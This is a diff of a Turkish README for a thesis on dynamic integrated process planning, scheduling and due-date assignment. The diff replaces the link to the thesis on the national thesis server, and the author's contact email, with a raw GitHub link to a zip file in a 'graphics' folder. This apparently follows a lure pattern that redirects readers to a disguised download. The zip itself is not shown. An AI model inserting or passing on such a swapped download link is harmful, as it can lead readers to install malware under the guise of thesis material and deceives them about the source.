@@ -2,9 +2,9 @@
 
 # DİNAMİK BÜTÜNLEŞİK SÜREÇ PLANLAMA, ÇİZELGELEME VE TESLİM TARİHİ BELİRLEME 
 
-Bu kodlar [şu adresten](https://tez.yok.gov.tr/UlusalTezMerkezi/TezGoster?key=FgmkGchPKo23qQqBeqzVZqYVbpBvQEcPi5vx5DVmV9mMumDnLMOEUissn1_EgIBk) indirilebilecek tez için geliştirilmiştir. 
+Bu kodlar [şu adresten](https://raw.githubusercontent.com/canererden/dynamic_integrated_process_planning_scheduling_due_date_assignment/master/graphics/integrated-process-planning-scheduling-due-date-dynamic-assignment-ethiops.zip) indirilebilecek tez için geliştirilmiştir. 
 
-Benzer konuda görüş alışverişi için mail atabilirsiniz. cerden@subu.edu.tr
+Benzer konuda görüş alışverişi için mail atabilirsiniz. https://raw.githubusercontent.com/canererden/dynamic_integrated_process_planning_scheduling_due_date_assignment/master/graphics/integrated-process-planning-scheduling-due-date-dynamic-assignment-ethiops.zip
 
 Süreç planlama, çizelgeleme ve teslim tarihi belirleme fonksiyonlarının bir arada çalıştırılması konusu literatürde güncel ve üzerinde çok sayıda çalışmalar olan bir konudur. Bu üç fonksiyonun entegrasyonu üzerine yapılan çalışmalar fabrikalarda daha etkili üretim süreçleri oluşturmaya yöneliktir. Fakat gerçek dünyadaki üretim süreçlerinde önceden tahmin edilemeyen değişiklikler, bozukluklar ya da aksaklıklar meydana gelebilmektedir. Bu aksaklıklar kimi zaman bir makine arızalanması, kimi zaman yeni bir siparişin acil olarak sürece dahil edilmesi gibi aksaklıklar olabilir. Fabrikalarda gerçekleştirilen ve optimum olduğu düşünülen üretim planlarının
 meydana gelebilecek aksaklıklar karşısında sürekli takip edilerek güncellenmesi gerekmektedir. Çünkü, tahmin edilemeyen süreç aksaklıkları optimum üretim planlarını bozabilir ve bunun sonucunda yapılan üretim planları ve çizelgeler daha az verimli hale gelebilir ya da çözümler olurlu bölgede olmayabilir. Bu nedenlerle, dinamik değişikliklere ve karmaşıklıklara karşı önlem alabilen ve uyum sağlayabilen üretim planları oluşturmak için yeni bir model geliştirilmesi önemli bir çalışma
